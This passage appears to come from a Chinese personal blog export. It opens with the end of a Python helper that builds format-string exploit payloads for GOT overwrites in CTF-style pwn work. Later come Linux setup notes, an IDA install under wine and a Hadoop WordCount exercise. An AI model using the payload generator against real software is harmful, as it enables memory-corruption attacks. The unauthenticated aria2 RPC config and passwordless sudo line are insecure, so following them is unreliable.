class="line"><span class="comment"># 打包地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packAddr</span><span class="params">(part)</span>:</span></span><br><span class="line">    addr =<span class="string">''</span>.join(x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> part)</span><br><span class="line">    address = <span class="string">''</span>.join(addr)</span><br><span class="line">    <span class="keyword">return</span> address</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动计算偏移</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offsetDeal</span><span class="params">(size)</span>:</span></span><br><span class="line">    length = <span class="number">12</span> * len(size)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        offset = length / <span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset = length / <span class="number">8</span></span><br><span class="line">    length = offset * <span class="number">8</span> </span><br><span class="line">    offset += <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> offset, length</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成payload</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payloadGenerate</span><span class="params">(size, offset)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[<span class="number">0</span>], offset)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(size)):</span><br><span class="line">        payload += <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[i]-size[i<span class="number">-1</span>],offset+i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">## 生成payload并对齐</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_payload</span><span class="params">(bewrite,  write， offset=<span class="number">0</span>)</span>:</span></span><br><span class="line">    part = Partion(write, bewrite)</span><br><span class="line">    size = sizeUp(part)</span><br><span class="line">    address = packAddr(part)</span><br><span class="line"></span><br><span class="line">    result = offsetDeal(size)</span><br><span class="line">    <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">        offset = result[<span class="number">0</span>]</span><br><span class="line">    length = result[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'offset is:'</span> + str(offset)</span><br><span class="line">    payload = payloadGenerate(size, offset)</span><br><span class="line">    payload = payload.ljust(length, <span class="string">'a'</span>)</span><br><span class="line">    payload += address</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = fmt_payload(exit_got,0x0000000000400626)</span></span><br><span class="line"><span class="comment"># payload = fmt_payload(exit_got,0x0000000000400626，10)</span></span><br></pre></td></tr></table></figure>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>写完后发觉，只适用于栈长度相对较大的，因为单字节写入的话，payload构造相对会比较长，所以是否还应该开个选项，双字节写入，四字节写入，不过那些是后话了，因为只需改改脚本就行了，编写脚本的目的只是为了更好的理解这个格式化字符串漏洞，理解他的整个过程，等我想到如何写通用payload，就是能设置长度的时候，在改进下。</p>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>格式化字符串</category>
      </categories>
      <tags>
        <tag>二进制,pwn,格式化字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>parrot linux问题解决</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="parot-linux系统问题总结"><a href="#parot-linux系统问题总结" class="headerlink" title="parot linux系统问题总结"></a>parot linux系统问题总结</h1><h2 id="出现命令行无法启动torbrowser-launcher"><a href="#出现命令行无法启动torbrowser-launcher" class="headerlink" title="出现命令行无法启动torbrowser-launcher"></a>出现命令行无法启动torbrowser-launcher</h2><p>这个问题我谷歌了很久，也没有得到有效的答案，所以只能自己动手测试，这是一个程序员基本功，我重新安装了好几次torbrowser-launcher，也没有得到解决，所以不是安装的问题，是机器环境的问题。</p><p>在我的parrot sercurity上出现的错误是这样的：<br><big> + Tor Browser Launcher</big></p><a id="more"></a>

<ul>
<li>By Micah Lee, licensed under MIT</li>
<li>version 0.3.1</li>
<li><a href="https://github.com/micahflee/torbrowser-launcher" target="_blank" rel="noopener">https://github.com/micahflee/torbrowser-launcher</a></li>
<li>Launching Tor Browser.</li>
<li>Running /home/greenhand/.local/share/torbrowser/tbb/x86_64/tor-browser_en-US/start-tor-browser.desktop</li>
<li>Launching ‘./Browser/start-tor-browser –detach’…</li>
<li>QFileSystemWatcher::removePaths: list is empty</li>
<li>QFileSystemWatcher::removePaths: list is empty </li>
</ul>
<p>解决方案可以直接往下划到底下，我先讲下处理这个问题思路<br>然后torbrowser-launcher没有启动,就这样就没了，我通过手动去官网下载了一波，解压后是可以运行的，然后将解压后的文件夹移动到tor默认位置那里，也就是上述出错的地方，tor浏览器居然运行不起来了，发现症结所在后，我创建了一个文件夹，然后将本身tor的文件夹移动到我新建的文件夹里，tor可以运行起来了，好吧，知道该怎么解决后就开始处理了</p>
<h3 id="处理方案"><a href="#处理方案" class="headerlink" title="处理方案"></a>处理方案</h3><p>直接移动后会报错，然后根据报错位置找到了<br><strong>/usr/lib/python3/dist-packages/torbrowser_launcher/</strong><br>这里有一堆py文件，然后经过手动探寻可以查到common.py里存放了位置信息，所以我将common.py里的 <strong>tbb_local = ‘{0}/.local/share/torbrowser/‘.format(homedir)</strong> 改成 <strong>tbb_local = ‘{0}/.local/share/torbrowser/test/‘.format(homedir)</strong><br>加多一层目录，然后命令行就可以完美启动了！</p>
<h2 id="出现软件无法启动问题"><a href="#出现软件无法启动问题" class="headerlink" title="出现软件无法启动问题"></a>出现软件无法启动问题</h2><p>删除沙盒里的配置文件就行，或者注释掉部分<br>/etc/firejail 存着对应软件的沙盒配置文件</p>
<h2 id="v2ray问题"><a href="#v2ray问题" class="headerlink" title="v2ray问题"></a>v2ray问题</h2><p>v2ray连不上有两个原因，<br>1.时间<br>2.配置文件，因为配置文件差了个流量控制的邮箱</p>
<p>时间问题可以安装ntpdate<br>sudo apt-get install ntpdate<br>sudo ntpdate 0.asia.pool.ntp.org</p>
<p>vi /etc/crontab<br>在末尾增加* */1 * * * ntpdate 0.asia.pool.ntp.org</p>
<p>同步到硬件<br>hwclock –systohc</p>
<h2 id="vmware问题"><a href="#vmware问题" class="headerlink" title="vmware问题"></a>vmware问题</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">VMWARE_VERSION=workstation-12.5.9</span><br><span class="line">TMP_FOLDER=/tmp/patch-vmware</span><br><span class="line">rm -fdr <span class="variable">$TMP_FOLDER</span></span><br><span class="line">mkdir -p <span class="variable">$TMP_FOLDER</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$TMP_FOLDER</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mkubecek/vmware-host-modules.git</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$TMP_FOLDER</span>/vmware-host-modules</span><br><span class="line">git checkout <span class="variable">$VMWARE_VERSION</span></span><br><span class="line">git fetch</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo rm /usr/lib/vmware/lib/libz.so.1/libz.so.1</span><br><span class="line">sudo ln -s /lib/x86_64-linux-gnu/libz.so.1 /usr/lib/vmware/lib/libz.so.1/libz.so.1</span><br><span class="line">sudo /etc/init.d/vmware restart</span><br></pre></td></tr></table></figure>

<h2 id="vimplus"><a href="#vimplus" class="headerlink" title="vimplus"></a>vimplus</h2><p>apt install vim-python-jedi<br>开机自启脚本</p>
<h2 id="双系统引导找回问题"><a href="#双系统引导找回问题" class="headerlink" title="双系统引导找回问题"></a>双系统引导找回问题</h2><p>进行live模式<br>先查看哪个是linux启动盘</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>
<p>然后挂载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/sda2 /mnt</span><br><span class="line">mount --<span class="built_in">bind</span> /proc /mnt/proc</span><br><span class="line">mount --<span class="built_in">bind</span> /dev /mnt/dev</span><br><span class="line">mount --<span class="built_in">bind</span> /sys /mnt/sys</span><br><span class="line">chroot /mnt</span><br><span class="line">apt-get install grub-pc <span class="comment">#可有可无</span></span><br><span class="line">grub-mkconfig <span class="comment">#可有可无</span></span><br><span class="line">update-grub</span><br><span class="line">grub-install /dev/sda <span class="comment">#可有可无</span></span><br></pre></td></tr></table></figure>


<h2 id="aria2"><a href="#aria2" class="headerlink" title="aria2"></a>aria2</h2><p>sudo apt-get install aria2</p>
<p>/etc/aria2/aria2.conf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用户名</span></span><br><span class="line"><span class="comment">#rpc-user=user</span></span><br><span class="line"><span class="comment">#密码</span></span><br><span class="line"><span class="comment">#rpc-passwd=passwd</span></span><br><span class="line"><span class="comment">#上面的认证方式不建议使用,建议使用下面的token方式</span></span><br><span class="line"><span class="comment">#设置加密的密钥</span></span><br><span class="line"><span class="comment">#rpc-secret=token</span></span><br><span class="line"><span class="comment">#允许rpc</span></span><br><span class="line"><span class="built_in">enable</span>-rpc=<span class="literal">true</span></span><br><span class="line"><span class="comment">#允许所有来源, web界面跨域权限需要</span></span><br><span class="line">rpc-allow-origin-all=<span class="literal">true</span></span><br><span class="line"><span class="comment">#允许外部访问，false的话只监听本地端口</span></span><br><span class="line">rpc-listen-all=<span class="literal">true</span></span><br><span class="line"><span class="comment">#RPC端口, 仅当默认端口被占用时修改</span></span><br><span class="line"><span class="comment">#rpc-listen-port=6800</span></span><br><span class="line"><span class="comment">#最大同时下载数(任务数), 路由建议值: 3</span></span><br><span class="line">max-concurrent-downloads=5</span><br><span class="line"><span class="comment">#断点续传</span></span><br><span class="line"><span class="built_in">continue</span>=<span class="literal">true</span></span><br><span class="line"><span class="comment">#同服务器连接数</span></span><br><span class="line">max-connection-per-server=5</span><br><span class="line"><span class="comment">#最小文件分片大小, 下载线程数上限取决于能分出多少片, 对于小文件重要</span></span><br><span class="line">min-split-size=10M</span><br><span class="line"><span class="comment">#单文件最大线程数, 路由建议值: 5</span></span><br><span class="line">split=10</span><br><span class="line"><span class="comment">#下载速度限制</span></span><br><span class="line">max-overall-download-limit=0</span><br><span class="line"><span class="comment">#单文件速度限制</span></span><br><span class="line">max-download-limit=0</span><br><span class="line"><span class="comment">#上传速度限制</span></span><br><span class="line">max-overall-upload-limit=0</span><br><span class="line"><span class="comment">#单文件速度限制</span></span><br><span class="line">max-upload-limit=0</span><br><span class="line"><span class="comment">#断开速度过慢的连接</span></span><br><span class="line"><span class="comment">#lowest-speed-limit=0</span></span><br><span class="line"><span class="comment">#验证用，需要1.16.1之后的release版本</span></span><br><span class="line"><span class="comment">#referer=*</span></span><br><span class="line"><span class="comment">#文件保存路径, 默认为当前启动位置</span></span><br><span class="line">dir=/Users/&lt;user_name&gt;/Downloads</span><br><span class="line"><span class="comment">#文件缓存, 使用内置的文件缓存, 如果你不相信Linux内核文件缓存和磁盘内置缓存时使用, 需要1.16及以上版本</span></span><br><span class="line"><span class="comment">#disk-cache=0</span></span><br><span class="line"><span class="comment">#另一种Linux文件缓存方式, 使用前确保您使用的内核支持此选项, 需要1.15及以上版本(?)</span></span><br><span class="line"><span class="comment">#enable-mmap=true</span></span><br><span class="line"><span class="comment">#文件预分配, 能有效降低文件碎片, 提高磁盘性能. 缺点是预分配时间较长</span></span><br><span class="line"><span class="comment">#所需时间 none &lt; falloc ? trunc « prealloc, falloc和trunc需要文件系统和内核支持</span></span><br><span class="line">file-allocation=prealloc</span><br></pre></td></tr></table></figure>

<p>/etc/init.d/aria2c</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides: aria2</span></span><br><span class="line"><span class="comment"># Required-Start: $remote_fs $network</span></span><br><span class="line"><span class="comment"># Required-Stop: $remote_fs $network</span></span><br><span class="line"><span class="comment"># Default-Start: 2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop: 0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: Aria2 Downloader</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></span><br><span class="line">start)</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> -n <span class="string">"已开启Aria2c"</span></span><br><span class="line"> sudo aria2c --conf-path=/etc/aria2/aria2.conf -D</span><br><span class="line">;;</span><br><span class="line">stop)</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> -n <span class="string">"已关闭Aria2c"</span></span><br><span class="line"> killall aria2c</span><br><span class="line">;;</span><br><span class="line">restart)</span><br><span class="line"> </span><br><span class="line"> killall aria2c</span><br><span class="line"> sudo aria2c --conf-path=/etc/aria2/aria2.conf -D</span><br><span class="line">;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>谷歌插件</p>
<h2 id="sudo-设置不用密码"><a href="#sudo-设置不用密码" class="headerlink" title="sudo 设置不用密码"></a>sudo 设置不用密码</h2><p>%greenhand ALL=(ALL) NOPASSWD: NOPASSWD:ALL</p>
<h2 id="阿里云docker加速镜像"><a href="#阿里云docker加速镜像" class="headerlink" title="阿里云docker加速镜像"></a>阿里云docker加速镜像</h2><p>vi /etc/docker/daemon.json</p>
<p>{</p>
<p>“registry-mirrors”: [“<a href="http://hub-mirror.c.163.com&quot;]" target="_blank" rel="noopener">http://hub-mirror.c.163.com&quot;]</a></p>
<p>}</p>
<p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors</a></p>
<h2 id="pip-换源"><a href="#pip-换源" class="headerlink" title="pip 换源"></a>pip 换源</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir ~/.pip</span><br><span class="line">cat &gt;&gt; ~/.pip/pip.conf &lt;&lt; EOF</span><br><span class="line">[global]</span><br><span class="line">index-url =  http://mirrors.aliyun.com/pypi/simple/ </span><br><span class="line">trusted-host = mirrors.aliyun.com</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<h2 id="禁用虚拟网卡"><a href="#禁用虚拟网卡" class="headerlink" title="禁用虚拟网卡"></a>禁用虚拟网卡</h2><p>内网段冲突</p>
<p>ifconfig b47cab9fe564 down</p>
<h2 id="docker-存在依赖无法删除"><a href="#docker-存在依赖无法删除" class="headerlink" title="docker 存在依赖无法删除"></a>docker 存在依赖无法删除</h2><p>docker commit 容器id 名称<br>docker save -o 压缩包.tar 新镜像名称:latest</p>
<p>删除所有关于这个的镜像以及容易<br>docker load -i ./压缩包.tar</p>
<h2 id="wine依赖问题"><a href="#wine依赖问题" class="headerlink" title="wine依赖问题"></a>wine依赖问题</h2><p>删除winehq-stable的官方源，用parrot的源安装就可以了</p>
<h2 id="parrot-关闭更新提示"><a href="#parrot-关闭更新提示" class="headerlink" title="parrot 关闭更新提示"></a>parrot 关闭更新提示</h2><p>修改配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/xdg/autostart/parrot-updater.desktop</span><br></pre></td></tr></table></figure>

<p>文件内容如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env xdg-open</span></span><br><span class="line">[Desktop Entry]</span><br><span class="line">Name=System Updater</span><br><span class="line">Comment=Update reminder <span class="keyword">for</span> Parrot OS</span><br><span class="line">Icon=synaptic</span><br><span class="line">Exec=/usr/bin/update-reminder scheduled</span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=</span><br><span class="line">X-MATE-Autostart-enabled=<span class="literal">true</span></span><br></pre></td></tr></table></figure>


<h2 id="配置文件导入导出"><a href="#配置文件导入导出" class="headerlink" title="配置文件导入导出"></a>配置文件导入导出</h2><p>dconf dump / &gt; dconf-settings.ini<br>dconf load / &lt; dconf-settings.ini</p>
<h2 id="耳机没声音，外放有声音"><a href="#耳机没声音，外放有声音" class="headerlink" title="耳机没声音，外放有声音"></a>耳机没声音，外放有声音</h2><p>重置下bios就行了</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>比赛细节注意点</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="pwn-细节"><a href="#pwn-细节" class="headerlink" title="pwn_细节"></a>pwn_细节</h1><p>保护全开情况下考虑部分覆盖，不要全部覆盖，开了pie后三位是固定的</p>]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>ida7.2的安装</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="论如何在linux上安装ida7-2以及安装插件"><a href="#论如何在linux上安装ida7-2以及安装插件" class="headerlink" title="论如何在linux上安装ida7.2以及安装插件"></a>论如何在linux上安装ida7.2以及安装插件</h1><p>序言：原来用ida pro7.0用了好久，听说ida新出了挺多新功能，又折腾了一天？太菜了，我只是想试试新功能而已，ida pro 7.2已经有插件可以同步反汇编程序和反编译程序视图，还有折腾了以前没折腾成的插件。其实最想的还是ida pro7.3,听说可以撤销。<br>我没找到ida pro7.2 linux版本，所以便用win下的替代了。linux下跑windows的软件，在我看来，首选就是wine了</p><a id="more"></a>
<p>这篇算是对我的那个环境配置的补充吧<br><a href="https://xz.aliyun.com/t/5749" target="_blank" rel="noopener">环境配置篇</a></p>
<h2 id="安装wine"><a href="#安装wine" class="headerlink" title="安装wine"></a>安装wine</h2><p>这里建议呢，安装winehq-stable版本<br><a href="https://wiki.winehq.org/Download" target="_blank" rel="noopener">官网下载地址</a></p>
<p>官网选后会有文档指示如何安装，这里我用的是debian发行版，所以我按我的来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">wget -nc https://dl.winehq.org/wine-builds/winehq.key</span><br><span class="line">sudo apt-key add winehq.key</span><br></pre></td></tr></table></figure>
<p>然后添加源，这里位置不尽相同,自行添加了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb https://dl.winehq.org/wine-builds/debian/ buster main</span><br></pre></td></tr></table></figure>
<p>更新源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
<p>安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install --install-recommends winehq-stable</span><br></pre></td></tr></table></figure>

<h2 id="下载ida-pro-7-2安装包"><a href="#下载ida-pro-7-2安装包" class="headerlink" title="下载ida pro 7.2安装包"></a>下载ida pro 7.2安装包</h2><p>这里相信各路神仙会有自己的办法的</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里假设安装包为ida.exe</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wine64 ida.exe</span><br></pre></td></tr></table></figure>
<p>然后windows的安装操作各位会吧，一路next也可以，安装完会提示安装python，也安装<br>然后转到.wine目录下的ida目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.wine/drive_c/<span class="string">'Program Files'</span>/</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
<p>ls结果如下<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6go7eabbkj30f301gq2z.jpg" alt="20190829172100.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">'IDA 7.2'</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wine64 ida</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wine64 ida64</span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6gobufrcmj30nj0h0abu.jpg" alt="20190829172516.png"><br>就运行成功了，到这里其实ida安装算完成了，可还要折腾插件啊，还有一些东西要折腾的可以参照<br><a href="https://bbs.pediy.com/thread-252208.htm" target="_blank" rel="noopener">看雪大佬的文章</a><br>就是做些替换工作</p>
<p>对我来说方便的插件</p>
<ol>
<li>lazyida</li>
<li>findcrypt</li>
<li>HrDevHelper</li>
<li>IDASkins</li>
<li>hexlight<br>具体介绍可以从这里看到<a href="https://github.com/onethawt/idaplugins-list" target="_blank" rel="noopener">idaplugins-list</a></li>
</ol>
<p>这里比较难装的就是findcrypt了，最主要他要自己装个python库，我原来的思路是从虚拟机共享文件夹，然后设置环境变量来pip install yara<br>现在我发觉更简单的方法了,先按照原来的方法到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wine64 easy_install-2.7.exe  yara</span><br><span class="line"><span class="built_in">cd</span> ~/.wine/drive_c/Python27/Scripts</span><br><span class="line">wine64 easy_install-2.7.exe  yara</span><br></pre></td></tr></table></figure>
<p>这样便安装成了</p>
<p>然后插件全放到ida7.2目录下的plugins里就成了<br>最终分享下界面</p>
<h2 id="界面share"><a href="#界面share" class="headerlink" title="界面share"></a>界面share</h2><ol>
<li><p>idaskin加hexlight高亮<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6gotziju8j30rb0ipju8.jpg" alt="20190829174242.png"></p>
</li>
<li><p>HrDevHelper的树型图<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6govgs0voj317o0lsn1d.jpg" alt="20190829174408.png"></p>
</li>
<li><p>lazyida dump数据<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6gox6396wj30fe02swef.jpg" alt="20190829174546.png"></p>
</li>
<li><p>至于findcrypt和lazyida的查找格式化字符串漏洞的就不截图了</p>
</li>
<li><p>dysnc我截图不了就算了，手机拍糊了点<br>最主要是要有一个好看的皮囊啊，我感觉这样配置下来比原来的好看多了</p>
</li>
</ol>
]]></content>
      <categories>
        <category>二进制</category>
        <category>调试器</category>
      </categories>
      <tags>
        <tag>二进制，ida</tag>
      </tags>
  </entry>
  <entry>
    <title>大数据作业</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="hadoop1"><a href="#hadoop1" class="headerlink" title="hadoop1"></a>hadoop1</h1><p>建议执行前先打快照，我原来就是不知道怎么折腾把环境搞崩了，然后又折腾花了好久</p><p>java代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.StringTokenizer;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.util.GenericOptionsParser;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCount</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WordCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line">        String[] otherArgs = (<span class="keyword">new</span> GenericOptionsParser(conf, args)).getRemainingArgs();</span><br><span class="line">        <span class="keyword">if</span>(otherArgs.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            System.err.println(<span class="string">"Usage: wordcount &lt;in&gt; [&lt;in&gt;...] &lt;out&gt;"</span>);</span><br><span class="line">            System.exit(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Job job = Job.getInstance(conf, <span class="string">"word count"</span>);</span><br><span class="line">        job.setJarByClass(WordCount.class);</span><br><span class="line">        job.setMapperClass(WordCount.TokenizerMapper.class);</span><br><span class="line">        job.setCombinerClass(WordCount.IntSumReducer.class);</span><br><span class="line">        job.setReducerClass(WordCount.IntSumReducer.class);</span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(IntWritable.class); </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; otherArgs.length - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">            FileInputFormat.addInputPath(job, <span class="keyword">new</span> Path(otherArgs[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> Path(otherArgs[otherArgs.length - <span class="number">1</span>]));</span><br><span class="line">        System.exit(job.waitForCompletion(<span class="keyword">true</span>)?<span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TokenizerMapper</span> <span class="keyword">extends</span> <span class="title">Mapper</span>&lt;<span class="title">Object</span>, <span class="title">Text</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> IntWritable one = <span class="keyword">new</span> IntWritable(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">private</span> Text word = <span class="keyword">new</span> Text();</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TokenizerMapper</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">map</span><span class="params">(Object key, Text value, Mapper&lt;Object, Text, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">            StringTokenizer itr = <span class="keyword">new</span> StringTokenizer(value.toString()); </span><br><span class="line">            <span class="keyword">while</span>(itr.hasMoreTokens()) &#123;</span><br><span class="line">                <span class="keyword">this</span>.word.set(itr.nextToken());</span><br><span class="line">                context.write(<span class="keyword">this</span>.word, one);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">IntSumReducer</span> <span class="keyword">extends</span> <span class="title">Reducer</span>&lt;<span class="title">Text</span>, <span class="title">IntWritable</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> IntWritable result = <span class="keyword">new</span> IntWritable();</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">IntSumReducer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Reducer&lt;Text, IntWritable, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            IntWritable val;</span><br><span class="line">            <span class="keyword">for</span>(Iterator i$ = values.iterator(); i$.hasNext(); sum += val.get()) &#123;</span><br><span class="line">                val = (IntWritable)i$.next();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.result.set(sum);</span><br><span class="line">            context.write(key, <span class="keyword">this</span>.result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a>



<p>选择File-&gt;Export-&gt;一系列next，最后要选择Main_Class</p>
<p><img src="_v_images/20191025211017021_1663740123.png" alt="记得保存main_class"></p>
<p>导出jar后，scp传上去</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp wordCounter.jar hadoop@192.168.150.133:/usr/<span class="built_in">local</span>/hadoop</span><br></pre></td></tr></table></figure>


<p>启动hadoop</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./sbin/start-all.sh</span><br></pre></td></tr></table></figure>
<p>创建文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/hdfs dfs -mkdir /<span class="built_in">test</span>/input</span><br><span class="line">./bin/hdfs dfs -mkdir /<span class="built_in">test</span>/output</span><br></pre></td></tr></table></figure>

<p>移动文件到目录下</p>
